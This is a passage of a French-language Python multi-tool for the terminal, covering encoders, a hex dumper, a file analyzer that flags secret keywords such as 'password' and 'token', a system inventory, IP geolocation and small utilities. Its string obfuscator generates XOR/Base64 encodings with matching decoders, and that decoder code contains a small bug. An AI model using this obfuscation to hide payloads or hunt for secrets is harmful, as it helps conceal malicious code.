    print(f"  {RED}[2]{RESET} Minifier (une ligne)")
    print(f"  {RED}[3]{RESET} Trier les cles + pretty print")
    action = ask_int("Action : ", 1)
    if action == 2:
        sortie = json.dumps(data, ensure_ascii=False, separators=(",", ":"))
    elif action == 3:
        sortie = json.dumps(data, ensure_ascii=False, indent=2, sort_keys=True)
    else:
        sortie = json.dumps(data, ensure_ascii=False, indent=2)
    print()
    print(sortie[:3000])
    if len(sortie) > 3000:
        warn(f"(tronque - {len(sortie)} caracteres au total)")
    if oui_non("Sauvegarder ?", False):
        chemin = chemin_out("format_" + time.strftime("%H%M%S") + ".json")
        ecrire_fichier(chemin, sortie)
        ok("Fichier : " + chemin)
    pause()


def mod_17():  # Base64 Encoder
    outil_titre("Base64 Encoder")
    print(f"  {RED}[1]{RESET} Encoder une chaine")
    print(f"  {RED}[2]{RESET} Decoder une chaine")
    print(f"  {RED}[3]{RESET} Encoder un fichier (binaire -> base64)")
    print(f"  {RED}[4]{RESET} Decoder vers un fichier")
    mode = ask_int("Ton choix (1-4) : ", 1)
    url_safe = oui_non("Variante URL-safe ?", False)
    iterations = ask_int("Iterations : ", 1)

    def enc(d):
        for _ in range(iterations):
            d = base64.urlsafe_b64encode(d) if url_safe else base64.b64encode(d)
        return d

    def dec(d):
        for _ in range(iterations):
            d = base64.urlsafe_b64decode(d + b"=" * (-len(d) % 4)) if url_safe else base64.b64decode(d + b"=" * (-len(d) % 4))
        return d

    try:
        if mode == 1:
            texte = ask("Texte a encoder : ", "")
            print()
            print(enc(texte.encode("utf-8")).decode())
        elif mode == 2:
            texte = ask("Base64 a decoder : ", "")
            print()
            try:
                print(dec(texte.encode()).decode("utf-8"))
            except UnicodeDecodeError:
                warn("Resultat binaire (non-utf8) :")
                print(dec(texte.encode())[:2000])
        elif mode == 3:
            src = ask("Chemin du fichier source : ", "")
            if not os.path.isfile(src):
                erreur("Fichier introuvable.")
            else:
                data = open(src, "rb").read()
                print(enc(data).decode())
                if oui_non("Sauvegarder le base64 ?", False):
                    chemin = chemin_out(os.path.basename(src) + ".b64")
                    ecrire_fichier(chemin, enc(data).decode())
                    ok("Fichier : " + chemin)
        elif mode == 4:
            src = ask("Fichier .b64 source : ", "")
            dst = ask("Fichier de sortie : ", "generated/output.bin")
            if os.path.isfile(src):
                try:
                    data = dec(open(src).read().encode())
                    ecrire_fichier(dst, data, mode="wb")
                    ok(f"{len(data)} octets ecrits dans {dst}")
                except Exception as e:
                    erreur("Decodage impossible : " + str(e))
            else:
                erreur("Fichier introuvable.")
    except Exception as e:
        erreur("Erreur : " + str(e))
    pause()


def mod_18():  # Hex Converter
    outil_titre("Hex Converter")
    print(f"  {RED}[1]{RESET} Texte -> Hex")
    print(f"  {RED}[2]{RESET} Hex -> Texte")
    print(f"  {RED}[3]{RESET} Hexdump d'un fichier")
    mode = ask_int("Ton choix (1-3) : ", 1)
    if mode == 1:
        texte = ask("Texte : ", "")
        print()
        print(texte.encode("utf-8").hex())
    elif mode == 2:
        valeur = ask("Hex (espaces autorises) : ", "")
        valeur = re.sub(r"\s+", "", valeur)
        try:
            octets = bytes.fromhex(valeur)
            try:
                print(octets.decode("utf-8"))
            except UnicodeDecodeError:
                warn("Contenu non-utf8, rendu brute :")
                print(repr(octets)[:2000])
        except Exception as e:
            erreur("Hex invalide : " + str(e))
    elif mode == 3:
        src = ask("Chemin du fichier : ", "")
        if not os.path.isfile(src):
            erreur("Fichier introuvable.")
            pause()
            return
        data = open(src, "rb").read()
        max_o = ask_int("Limite d'octets a afficher : ", min(len(data), 512))
        adresse = 0
        for i in range(0, min(max_o, len(data)), 16):
            bloc = data[i:i + 16]
            hexa = " ".join(f"{b:02x}" for b in bloc)
            ascii_ = "".join(chr(b) if 32 <= b < 127 else "." for b in bloc)
            print(f"  {adresse:08x}  {hexa:<48} |{ascii_}|")
            adresse += 16
        info(f"{len(data)} octets au total ({taille_humaine(len(data))})")
        if oui_non("Sauvegarder le hexdump complet ?", False):
            chemin = chemin_out("hexdump_" + time.strftime("%H%M%S") + ".txt")
            lignes = []
            for i in range(0, len(data), 16):
                bloc = data[i:i + 16]
                lignes.append(f"{i:08x}  {' '.join(f'{b:02x}' for b in bloc):<48} |{''.join(chr(b) if 32 <= b < 127 else '.' for b in bloc)}|")
            ecrire_fichier(chemin, "\n".join(lignes) + "\n")
            ok("Fichier : " + chemin)
    pause()


def mod_19():  # File Analyzer
    outil_titre("File Analyzer")
    src = ask("Chemin du fichier a analyser : ", __file__)
    if not os.path.isfile(src):
        erreur("Fichier introuvable.")
        pause()
        return

    data = open(src, "rb").read()
    st = os.stat(src)
    nom = os.path.basename(src)
    print()
    info("Informations generales :")
    print(f"  Fichier : {nom}")
    print(f"  Taille  : {taille_humaine(st.st_size)} ({st.st_size} octets)")
    print(f"  Modifie : {time.ctime(st.st_mtime)}")
    print(f"  Entropie de Shannon : {entropie(data):.2f} bits/octet")
    if st.st_size:
        print(f"  Taux de compression approx. (zlib) : {len(data) / max(1, len(__import__('zlib').compress(data[:1048576]))):.1f}x")

    info("Signatures (magic bytes) :")
    def magique(d):
        m = {
            b"\x7fELF": "ELF (Linux binaire)", b"MZ": "PE (Windows exe/dll)",
            b"\x89PNG": "PNG image", b"\xff\xd8\xff": "JPEG image",
            b"GIF8": "GIF image", b"%PDF": "PDF document",
            b"PK\x03\x04": "ZIP / Office / JAR", b"Rar!": "RAR archive",
            b"7z\xbc\xaf": "7z archive", b"\x1f\x8b": "GZIP",
            b"SQLite format 3": "SQLite base", b"\x00\x00\x01\x00": "ICO",
            b"<?xml": "XML", b"<!DOCTYPE": "HTML/DTD", b"BM": "BMP image",
        }
        for sig, lib in m.items():
            if d[:len(sig)] == sig:
                return lib
        if d[:4].hex().upper() == "CAFEBABE":
            return "Java class"
        return "Inconnue / texte ou format non reconnu"

    print(f"  {magique(data)}")
    if data[:2] == b"MZ":
        try:
            import struct as _s
            pe_off = _s.unpack("<I", data[0x3C:0x40])[0]
            machine = _s.unpack("<H", data[pe_off + 4:pe_off + 6])[0]
            print(f"  Header PE a 0x{pe_off:x} | Machine : 0x{machine:04x} ({'x64' if machine == 0x8664 else 'x86' if machine == 0x14c else '?'})")
        except Exception:
            pass

    info("Hashs :")
    for nom_hash in ("md5", "sha1", "sha256", "sha512"):
        h = hashlib.new(nom_hash)
        h.update(data)
        print(f"  {nom_hash.upper():7} {h.hexdigest()}")

    info("Elements interessants (premiers) :")
    try:
        texte = data.decode("utf-8", "ignore")
        urls = sorted(set(re.findall(r"https?://[^\s\"'<>]{4,120}", texte)))[:8]
        ips = sorted(set(re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", texte)))[:8]
        emails = sorted(set(re.findall(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", texte)))[:8]
        mots_cle = [m for m in ("password", "token", "secret", "api_key", "BEGIN RSA", "webhook", "login", "admin") if m.lower() in texte.lower()]
        if urls:
            print(f"  URLs : {', '.join(urls)}")
        if ips:
            print(f"  IPs  : {', '.join(ips)}")
        if emails:
            print(f"  Emails : {', '.join(emails)}")
        if mots_cle:
            print(f"  Mots sensibles : {', '.join(mots_cle)}")
        if not (urls or ips or emails or mots_cle):
            print("  (rien de flagrant)")
    except Exception:
        pass
    pause()


def mod_20():  # String Obfuscator
    outil_titre("String Obfuscator")
    print(f"  {RED}[1]{RESET} XOR + Base64 (avec decodeur Python genere)")
    print(f"  {RED}[2]{RESET} Hex + decodeur")
    print(f"  {RED}[3]{RESET} Charcode (decimal) + decodeur")
    print(f"  {RED}[4]{RESET} Empilement base64 (xN)")
    methode = ask_int("Methode (1-4) : ", 1)
    texte = ask("Chaine a obfusquer : ", "Hello World")
    cle_xor = ask("Cle XOR (si methode 1) : ", "k3y")

    if methode == 1:
        octets = texte.encode("utf-8")
        cle = cle_xor.encode("utf-8")
        xored = bytes(b ^ cle[i % len(cle)] for i, b in enumerate(octets))
        b64 = base64.b64encode(xored).decode()
        hex_cle = cle.hex()
        decodeur = f'''# decodeur genere
import base64
b64 = "{b64}"
cle = bytes.fromhex("{hex_cle}")
data = base64.b64decode(b64)
print(bytes(b ^ cle[i %% len(cle)] for i, b in enumerate(data)).decode())
'''
        print()
        print(f"  {WHITE}Donnee obfusquee :{RESET} {b64}")
        print(f"  {WHITE}Cle (hex) :{RESET} {hex_cle}")
        info("Decodeur genere ci-dessous :")
        print(decodeur)
    elif methode == 2:
        h = texte.encode("utf-8").hex()
        decodeur = f'''# decodeur genere
print(bytes.fromhex("{h}").decode())
'''
        print()
        print(f"  {WHITE}Hex :{RESET} {h}")
        info("Decodeur genere ci-dessous :")
        print(decodeur)
    elif methode == 3:
        codes = ",".join(str(ord(c)) for c in texte)
        decodeur = f'''# decodeur genere
print("".join(chr(c) for c in [{codes}]))
'''
        print()
        print(f"  {WHITE}Codes :{RESET} {codes}")
        info("Decodeur genere ci-dessous :")
        print(decodeur)
    elif methode == 4:
        n = ask_int("Nombre d'encodages : ", 3)
        courant = texte.encode("utf-8")
        for _ in range(n):
            courant = base64.b64encode(courant)
        final = courant.decode()
        reverse = "base64.b64decode(" * n + '"' + final + '"' + ")" * n
        print()
        print(f"  {WHITE}Empile x{n} :{RESET} {final}")
        info("Pour decoder : " + reverse)
        info("En python : print(" + reverse.replace("base64.b64decode(", "base64.b64decode(") + ".decode())")

    if oui_non("Sauvegarder le decodeur ?", False):
        chemin = chemin_out("decodeur_" + time.strftime("%H%M%S") + ".py")
        ecrire_fichier(chemin, decodeur)
        ok("Fichier : " + chemin)
    pause()


# ============================================================================
#  MODULES 21-30  (PAGE 1 - Dev / Misc)
# ============================================================================

def mod_21():  # Fake Terminal
    outil_titre("Fake Terminal")
    info("Simulation de terminal : tout est FAUX, c'est le but de l'outil.")
    info("Commandes demo : help, whoami, ipconfig, netstat, dir, cd, echo, ping, cls, exit")

    reponses = {
        "help": "Commandes disponibles : help, whoami, ipconfig, netstat, dir, cd, echo, ping, cls, exit",
        "whoami": "desktop-7gh42jc\\" + getpass.getuser(),
        "ipconfig": (
            "Configuration IP de Windows\n\n"
            "Carte Ethernet Ethernet0 :\n"
            "   Adresse IPv4. . . . . . . . . . . : 192.168.1.42\n"
            "   Masque de sous-reseau. . . . . . . : 255.255.255.0\n"
            "   Passerelle par defaut. . . . . . . : 192.168.1.1\n\n"
            "Carte LAN sans fil Wi-Fi :\n"
            "   Adresse IPv4. . . . . . . . . . . : 192.168.1.43\n"
            "   Passerelle par defaut. . . . . . . : 192.168.1.1"),
        "netstat": "Connexions actives\n\n  Proto  Adresse locale         Adresse distante       Etat\n  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING\n  TCP    127.0.0.1:5000         0.0.0.0:0              LISTENING\n  TCP    192.168.1.42:54320     104.26.10.229:443      ETABLIE",
        "dir": " Le volume de la cle ne porte pas de nom.\n\n Repertoire de C:\\Users\\" + getpass.getuser() + "\n\n02/01/2026  14:22    <REP>          Documents\n02/01/2026  14:22    <REP>          Images\n05/06/2026  09:12            4 215 rapport.pdf\n12/06/2026  18:45           18 432 data.xlsx\n               2 fichier(s)           22 647 octets",
    }

    try:
        while True:
            cmd = input(f"{GREEN}{getpass.getuser()}@{socket.gethostname()}{RESET}:{YELLOW}~{RESET}$ ")
            cmd = cmd.strip()
            if not cmd:
                continue
            if cmd.lower() in ("exit", "quit", "logout", "back", "menu"):
                ok("Retour au menu.")
                break
            if cmd.lower() == "cls" or cmd.lower() == "clear":
                os.system("cls" if os.name == "nt" else "clear")
                continue
            if cmd.lower().startswith("echo "):
                print(cmd[5:])
                continue
            if cmd.lower().startswith("ping "):
                cible = cmd[5:].strip()
                for _ in range(4):
                    print("Reponse de " + cible + " : octets=32 temps=" + str(random.randint(1, 60)) + " ms TTL=118")
                    time.sleep(0.5)
                continue
            if cmd.lower().startswith("cd "):
                print("(simulation) Repertoire courant : " + cmd[3:].strip())
                continue
            base = cmd.lower().split()[0] if cmd.split() else cmd.lower()
            if base in reponses:
                print(reponses[base])
            else:
                print(f"'{base}' n'est pas reconnu en tant que commande interne ou externe.")
    except (KeyboardInterrupt, EOFError):
        pass
    pause()


def mod_22():  # System Scanner
    outil_titre("System Scanner")
    info("Inventaire local de la machine (sans dependance).")

    print()
    info("Systeme :")
    print(f"  Machine   : {platform.node()}")
    print(f"  Systeme   : {platform.system()} {platform.release()} ({platform.version()})")
    print(f"  Machine   : {platform.machine()}")
    print(f"  Processeur: {platform.processor() or 'n/a'}")
    print(f"  Python    : {sys.version.split()[0]} ({sys.executable})")
    print(f"  User      : {getpass.getuser()}")
    try:
        print(f"  Uptime    : {int(time.time() - (ctypes.windll.kernel32.GetTickCount64() / 1000)) if os.name == 'nt' else 'n/a'} s")
    except Exception:
        pass

    info("Materiel :")
    print(f"  CPU (logiques) : {os.cpu_count() or 'n/a'}")
    if os.name == "nt":
        try:
            class MEMORYSTATUSEX(ctypes.Structure):
                _fields_ = [("dwLength", ctypes.c_ulong), ("dwMemoryLoad", ctypes.c_ulong),
                            ("ullTotalPhys", ctypes.c_ulonglong), ("ullAvailPhys", ctypes.c_ulonglong),
                            ("ullTotalPageFile", ctypes.c_ulonglong), ("ullAvailPageFile", ctypes.c_ulonglong),
                            ("ullTotalVirtual", ctypes.c_ulonglong), ("ullAvailVirtual", ctypes.c_ulonglong),
                            ("ullAvailExtendedVirtual", ctypes.c_ulonglong)]
            m = MEMORYSTATUSEX()
            m.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
            ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(m))
            total_g = m.ullTotalPhys / (1024 ** 3)
            libre_g = m.ullAvailPhys / (1024 ** 3)
            print(f"  RAM totale  : {total_g:.1f} Go")
            print(f"  RAM libre   : {libre_g:.1f} Go ({100 * libre_g / total_g:.0f}%)")
        except Exception:
            pass

    info("Disques :")
    if os.name == "nt":
        import string as _string
        for lettre in _string.ascii_uppercase:
            racine = lettre + ":\\"
            if os.path.exists(racine):
                try:
                    total, libre, _ = shutil.disk_usage(racine)
                    print(f"  {racine:<4} {taille_humaine(total):>10} total  {taille_humaine(libre):>10} libre  ({100 * libre / total:.0f}%)")
                except Exception:
                    pass
    else:
        try:
            total, libre, _ = shutil.disk_usage("/")
            print(f"  /        {taille_humaine(total):>10} total  {taille_humaine(libre):>10} libre")
        except Exception:
            pass

    info("Reseau :")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        print(f"  IP locale    : {s.getsockname()[0]}")
        s.close()
    except Exception:
        pass
    print(f"  IP publique  : {ip_publique()}")

    info("Processus (top consommateurs si tasklist dispo) :")
    if os.name == "nt":
        try:
            p = subprocess.run(["tasklist", "/FO", "CSV", "/NH"], capture_output=True, text=True, timeout=20)
            procs = {}
            for ligne in p.stdout.splitlines():
                m = re.match(r'^"([^"]+)","(\d+)","([^"]+)","([^"]+)","([\d,]+) K"', ligne)
                if m:
                    procs[m.group(1)] = int(m.group(5).replace(",", ""))
            top = sorted(procs.items(), key=lambda x: x[1], reverse=True)[:10]
            for nom_proc, mem in top:
                print(f"  {nom_proc:<28} {taille_humaine(mem * 1024)}")
        except Exception:
            print("  (tasklist indisponible)")
    else:
        try:
            p = subprocess.run(["ps", "-eo", "comm", "--sort=-%mem"], capture_output=True, text=True, timeout=10)
            for ligne in p.stdout.splitlines()[:10]:
                if ligne.strip():
                    print("  " + ligne)
        except Exception:
            print("  (ps indisponible)")

    if oui_non("Sauvegarder le rapport ?", True):
        chemin = chemin_out("system_scan_" + time.strftime("%H%M%S") + ".txt")
        rapport = [
            "System Scanner - " + time.ctime(),
            "Machine   : " + platform.node(),
            "Systeme   : " + platform.platform(),
            "Python    : " + sys.version,
            "User      : " + getpass.getuser(),
            "CPU       : " + str(os.cpu_count()),
            "IP locale : " + (socket.gethostbyname(socket.gethostname())),
            "IP pub    : " + ip_publique(),
        ]
        ecrire_fichier(chemin, "\n".join(rapport) + "\n")
        ok("Rapport : " + chemin)
    pause()


def mod_23():  # IP Intelligence
    outil_titre("IP Intelligence")
    info("Geolocalisation / FAI / reverse DNS / liste noire.")
    cible = ask("Adresse IP (vide = IP publique) : ", "")
    if not cible:
        cible = ip_publique()
    info("IP cible : " + cible)

    try:
        ipaddress.ip_address(cible)
    except Exception:
        erreur("Adresse IP invalide.")
        pause()
        return

    geo = geo_ip(cible)
    if geo:
        print()
        info("Geolocalisation (ip-api.com) :")
        afficher_dict({
            "Pays": f"{geo.get('country')} ({geo.get('countryCode')})",
            "Region": geo.get("regionName"),
            "Ville": geo.get("city"),
            "Code postal": geo.get("zip"),
            "Lat/Lon": f"{geo.get('lat')}, {geo.get('lon')}",
            "Fuseau": geo.get("timezone"),
            "FAI": geo.get("isp"),
            "Organisation": geo.get("org"),
            "AS": geo.get("as"),
            "Reverse DNS": geo.get("reverse", "n/a"),
            "Mobile": geo.get("mobile"),
            "Proxy": geo.get("proxy"),
            "Hébergement": geo.get("hosting"),
        })
    else:
        warn("Service geo injoignable.")

    print()
    info("Reverse DNS (DoH) :")
    rev = dns_lookup(cible, "PTR")
    print("  " + (rev[0] if rev else "aucun enregistrement PTR"))

    print()
    info("Liste noire Spamhaus ZEN :")
    zen = spamhaus_dnsbl(cible)
    if zen:
        for code in zen:
            print(f"  {RED}LISTE{code} - signale{RESET}")
    else:
        ok("non listee")

    # carte rapide via geo
    if geo and geo.get("lat"):
        lat, lon = geo["lat"], geo["lon"]
        print()
        info("Carte : https://www.openstreetmap.org/?mlat=" + str(lat) + "&mlon=" + str(lon) + "#map=10/" + str(lat) + "/" + str(lon))
        if oui_non("Ouvrir dans le navigateur ?", False):
            webbrowser.open(f"https://www.openstreetmap.org/?mlat={lat}&mlon={lon}#map=10/{lat}/{lon}")

    if oui_non("Sauvegarder le rapport ?", False):
        chemin = chemin_out("ipintel_" + cible.replace(".", "_") + ".json")
        ecrire_fichier(chemin, json.dumps({"ip": cible, "geo": geo, "spamhaus": zen}, indent=2))
        ok("Fichier : " + chemin)
    pause()


def mod_24():  # Lorem Ipsum Generator
    outil_titre("Lorem Ipsum Generator")
    print(f"  {RED}[1]{RESET} Paragraphes")
    print(f"  {RED}[2]{RESET} Phrases")
    print(f"  {RED}[3]{RESET} Mots")
    type_gen = ask_int("Type (1-3) : ", 1)
    quantite = ask_int("Quantite : ", 3 if type_gen == 1 else 5)
    lorem_commence = oui_non("Commencer par 'Lorem ipsum dolor sit amet...' ?", True)

    mots = ("lorem ipsum dolor sit amet consectetur adipiscing elit sed do eiusmod tempor incididunt ut labore et dolore magna aliqua enim ad minim veniam quis nostrud exercitation ullamco laboris nisi aliquip ex ea commodo consequat duis aute irure in reprehenderit voluptate velit esse cillum eu fugiat nulla pariatur excepteur sint occaecat cupidatat non proident sunt culpa qui officia deserunt mollit anim id est laborum").split()

    def phrase():
        n = random.randint(8, 20)
        debut = "Lorem ipsum dolor sit amet" if lorem_commence and random.random() < 0.3 else ""
        p = []
        if debut:
            p.append(debut)
        while len(p) < n:
            p.append(random.choice(mots))
        return " ".join(p[:1][0][:1].upper() + p[:1][0][1:] if False else p).capitalize() + "."

    if type_gen == 1:
        sortie = []
        for _ in range(quantite):
            nb_ph = random.randint(4, 8)
            para = " ".join(phrase() for _ in range(nb_ph))
            if lorem_commence:
                para = "Lorem ipsum dolor sit amet, consectetur adipiscing elit. " + para[len("Lorem ipsum dolor sit amet, consectetur adipiscing elit. "):] if para.startswith("Lorem ipsum dolor sit amet") else "Lorem ipsum dolor sit amet, consectetur adipiscing elit. " + para
            sortie.append(para)
        texte = "\n\n".join(sortie)
    elif type_gen == 2:
        texte = "\n".join(phrase() for _ in range(quantite))
    else:
        texte = " ".join(random.choice(mots) for _ in range(quantite))

    print()
    print(texte)
    if oui_non("Sauvegarder ?", False):
        chemin = chemin_out("lorem_" + time.strftime("%H%M%S") + ".txt")
        ecrire_fichier(chemin, texte + "\n")
        ok("Fichier : " + chemin)
    pause()


def mod_25():  # Regex Tester
    outil_titre("Regex Tester")
    motif = ask("Motif regex : ", r"\b[A-Z][a-z]+\b")
    print()
    print(f"  {RED}[1]{RESET} Recherche (findall)")
    print(f"  {RED}[2]{RESET} finditer avec positions + groupes")
    print(f"  {RED}[3]{RESET} match (depart de la chaine)")
    mode_t = ask_int("Mode (1-3) : ", 1)

    insensible = oui_non("Insensible a la casse ?", False)
    multiligne = oui_non("Mode multiligne (^/$ par lignes) ?", False)
    dotall = oui_non("Dotall (. matche \\n) ?", False)

    texte = lire_multiligne("Colle le texte a tester puis valide avec une ligne vide :")
    if not texte:
        erreur("Texte vide.")
        pause()
        return

    flags = 0
    if insensible:
        flags |= re.I
    if multiligne:
        flags |= re.M
    if dotall:
        flags |= re.S

    try:
        prog = re.compile(motif, flags)
    except Exception as e:
        erreur("Regex invalide : " + str(e))
        pause()
        return

    print()
    t0 = time.time()
    if mode_t == 3:
        m = prog.match(texte)
        if m:
            print(f"  {GREEN}Match{RESET} : {m.group(0)!r} (positions {m.start()}-{m.end()})")
            for i, g in enumerate(m.groups(), 1):
                print(f"    groupe {i} : {g!r}")
        else:
            warn("Aucun match au debut de la chaine.")
    elif mode_t == 2:
        trouve = list(prog.finditer(texte))
        for m in trouve[:30]:
            print(f"  {m.start():>6}-{m.end():<6} {m.group(0)!r}")
            for i, g in enumerate(m.groups(), 1):
                if g is not None:
                    print(f"           groupe {i} : {g!r}")
        print(f"  -> {len(trouve)} correspondance(s)")
    else:
        trouve = prog.findall(texte)
        for m in trouve[:30]:
            print("  " + repr(m))
        print(f"  -> {len(trouve)} correspondance(s)")
    info(f"Traite en {(time.time() - t0) * 1000:.1f} ms | Texte : {len(texte)} caracteres")
    pause()


def mod_26():  # Timestamp Converter
    outil_titre("Timestamp Converter")
    maintenant = time.time()
    print()
    info("Maintenant :")
    print(f"  Epoch (s)      : {int(maintenant)}")
    print(f"  Epoch (ms)     : {int(maintenant * 1000)}")
    print(f"  Local          : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"  UTC            : {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"  ISO 8601       : {datetime.now().astimezone().isoformat()}")
    print(f"  Fichier (GMT)  : {time.strftime('%a, %d %b %Y %H:%M:%S GMT', time.gmtime())}")

    print()
    print("Boucle de conversion (q pour quitter) :")
    try:
        while True:
            saisie = input(f"{RED}[?]{RESET} Epoch (s/ms) ou date (AAAA-MM-JJ HH:MM:SS) -> ").strip()
            if saisie.lower() in ("q", "quit", ""):
                break
            try:
                nb = float(saisie)
                if nb > 1e11:
                    nb /= 1000
                print(f"  -> {datetime.fromtimestamp(nb).strftime('%Y-%m-%d %H:%M:%S')} local")
                print(f"  -> {datetime.fromtimestamp(nb, tz=timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}")
            except ValueError:
                for fmt in ("%Y-%m-%d %H:%M:%S", "%Y-%m-%d %H:%M", "%d/%m/%Y %H:%M:%S", "%d/%m/%Y", "%Y-%m-%d"):
                    try:
                        dt = datetime.strptime(saisie, fmt)
                        print(f"  -> {int(dt.timestamp())} (epoch s) | {int(dt.timestamp() * 1000)} (ms)")
                        break
                    except ValueError:
                        continue
                else:
                    print(f"  {RED}[!]{RESET} Format non reconnu. Formats tries : " + ", ".join(["AAAA-MM-JJ HH:MM:SS", "JJ/MM/AAAA"]))
    except (KeyboardInterrupt, EOFError):
        pass
    pause()


def mod_27():  # Color Picker
    outil_titre("Color Picker")
    print(f"  {RED}[1]{RESET} Hex -> apercu / RGB / HSL")
    print(f"  {RED}[2]{RESET} RGB -> apercu / hex")
    print(f"  {RED}[3]{RESET} Palette 256 (grille)")
    print(f"  {RED}[4]{RESET} Aide codes ANSI")
    choix = ask_int("Ton choix (1-4) : ", 1)

    def hex_to_rgb(h):
        h = h.lstrip("#")
        if len(h) == 3:
            h = "".join(c * 2 for c in h)
        return tuple(int(h[i:i + 2], 16) for i in (0, 2, 4))

    def rgb_to_hex(r, g, b):
        return "#{:02x}{:02x}{:02x}".format(r, g, b)

    def rgb_to_hsl(r, g, b):
        r, g, b = r / 255, g / 255, b / 255
        mx, mn = max(r, g, b), min(r, g, b)
        l = (mx + mn) / 2
        if mx == mn:
            return 0, 0, l
        d = mx - mn
        s = d / (2 - mx - mn) if l > 0.5 else d / (mx + mn)
        if mx == r:
            h = (g - b) / d + (6 if g < b else 0)
        elif mx == g:
            h = (b - r) / d + 2
        else:
            h = (r - g) / d + 4
        return round(h * 60), round(s * 100), round(l * 100)

    if choix == 1:
        h = ask("Hex (#rgb ou #rrggbb) : ", "#ff0044")
        try:
            r, g, b = hex_to_rgb(h)
            print()
            print(f"\033[48;2;{r};{g};{b}m{' ' * 40}\033[0m  <- apercu")
            print(f"  Hex : {rgb_to_hex(r, g, b)}")
            print(f"  RGB : {r}, {g}, {b}")
            hh, ss, ll = rgb_to_hsl(r, g, b)
            print(f"  HSL : {hh}, {ss}%, {ll}%")
        except Exception:
            erreur("Hex invalide.")
    elif choix == 2:
        saisie = ask("RGB separes par des virgules : ", "255,0,68")
        try:
            r, g, b = (int(x.strip()) for x in saisie.split(","))
            print()
            print(f"\033[48;2;{r};{g};{b}m{' ' * 40}\033[0m  <- apercu")
            print(f"  Hex : {rgb_to_hex(r, g, b)}")
            hh, ss, ll = rgb_to_hsl(r, g, b)
            print(f"  HSL : {hh}, {ss}%, {ll}%")
        except Exception:
            erreur("RGB invalide (format: r,g,b).")
    elif choix == 3:
        print()
        for base in range(0, 256, 16):
            ligne = ""
            for i in range(16):
                code = base + i
                ligne += f"\033[48;5;{code}m {code:>3} \033[0m"
            print("  " + ligne)
        print()
        info("Utilisation : \033[38;5;<code>m texte \033[0m (texte) / \033[48;5;<code>m (fond)")
    elif choix == 4:
        print()
        print("  Codes ANSI courants :")
        print("    \\033[0m        reset")
        print("    \\033[1m        gras       \\033[3m italique")
        print("    \\033[4m        souligne   \\033[7m inverse")
        print("    \\033[38;5;Nm  texte 256 couleurs (N=0-255)")
        print("    \\033[48;5;Nm  fond 256 couleurs")
        print("    \\033[38;2;R;G;Bm  texte truecolor")
        print()
        info("Demo :")
        print(f"  {RED}rouge{RESET} {YELLOW}jaune{RESET} {GREEN}vert{RESET} {CYAN}cyan{RESET} {WHITE}blanc{RESET}")
    pause()


def mod_28():  # Code Formatter
    outil_titre("Code Formatter")
    print(f"  {RED}[1]{RESET} JSON (pretty / minifie)")
    print(f"  {RED}[2]{RESET} Python (nettoyage basique : espaces, lignes vides, indent)")
    print(f"  {RED}[3]{RESET} HTML (indentation des balises)")
    lang = ask_int("Langage (1-3) : ", 1)
    texte = lire_multiligne("Colle ton code puis valide avec une ligne vide :")
    if not texte.strip():
        erreur("Saisie vide.")
        pause()
        return

    if lang == 1:
        try:
            data = json.loads(texte)
        except Exception as e:
            erreur("JSON invalide : " + str(e))
            pause()
            return
        print(f"  {RED}[1]{RESET} Pretty print")
        print(f"  {RED}[2]{RESET} Minifie")
        act = ask_int("Action : ", 1)
        sortie = json.dumps(data, ensure_ascii=False, indent=2) if act == 1 else json.dumps(data, ensure_ascii=False, separators=(",", ":"))
    elif lang == 2:
        lignes = texte.splitlines()
        # normalise espaces de fin + ligne vide unique
        propres = []
        vide_attendu = False
        for ligne in lignes:
            ligne = ligne.rstrip()
            if not ligne.strip():
                if not vide_attendu:
                    propres.append("")
                vide_attendu = True
            else:
                # tabs -> 4 espaces en debut
                indentation = len(ligne) - len(ligne.lstrip(" \t"))
                nouvelle = " " * indentation + ligne.lstrip(" \t")
                propres.append(nouvelle)
                vide_attendu = False
        while propres and propres[0] == "":
            propres.pop(0)
        while propres and propres[-1] == "":
            propres.pop()
        sortie = "\n".join(propres)
    elif lang == 3:
        # indentation naive par balises
        sortie = texte
        lignes = []
        profondeur = 0
        for m in re.finditer(r"(<[^>]+>)", texte):
            balise = m.group(1)
            ligne = texte[:m.start()].strip()
            reste = texte[m.end():]
            if ligne:
                lignes.append("  " * profondeur + ligne)
            fermante = balise.startswith("</") or balise.startswith("<!--") or balise.endswith("/>") or balise.startswith("<!")
            if fermante and not balise.startswith("</"):
                lignes.append("  " * profondeur + balise)
                continue
            if balise.startswith("</"):
                profondeur = max(0, profondeur - 1)
                lignes.append("  " * profondeur + balise)
            else:
                lignes.append("  " * profondeur + balise)
                profondeur += 1
            texte = reste
        if texte.strip():
            lignes.append("  " * profondeur + texte.strip())
        sortie = "\n".join(lignes)

    print()
    print(sortie[:3000])
    if len(sortie) > 3000:
        warn(f"(tronque - {len(sortie)} caracteres)")
    if oui_non("Sauvegarder ?", False):
        chemin = chemin_out("format_" + time.strftime("%H%M%S") + ".txt")
        ecrire_fichier(chemin, sortie)
        ok("Fichier : " + chemin)
    pause()


def mod_29():  # Random Generator
    outil_titre("Random Generator")
    while True:
        print()
        print(f"  {RED}[1]{RESET} Nombres")
        print(f"  {RED}[2]{RESET} UUID v4")
        print(f"  {RED}[3]{RESET} Octets hex (clé 16/32 octets...)")
        print(f"  {RED}[4]{RESET} Token URL-safe")
        print(f"  {RED}[5]{RESET} Des (lancer un de)")
        print(f"  {RED}[6]{RESET} Pile ou face")
        print(f"  {RED}[7]{RESET} Choisir dans une liste")
        print(f"  {RED}[8]{RESET} Melanger des lignes (texte)")
        print(f"  {RED}[0]{RESET} Quitter")
        c = ask_int("Choix : ", 1)
        if c == 0:
            break
        if c == 1:
            mini = ask_int("Minimum : ", 0)
            maxi = ask_int("Maximum : ", 100)
            n = ask_int("Combien : ", 10)
            print("  " + ", ".join(str(random.randint(mini, maxi)) for _ in range(n)))
        elif c == 2:
            n = ask_int("Combien : ", 3)
            for _ in range(n):
                print("  " + str(uuid.uuid4()))
        elif c == 3:
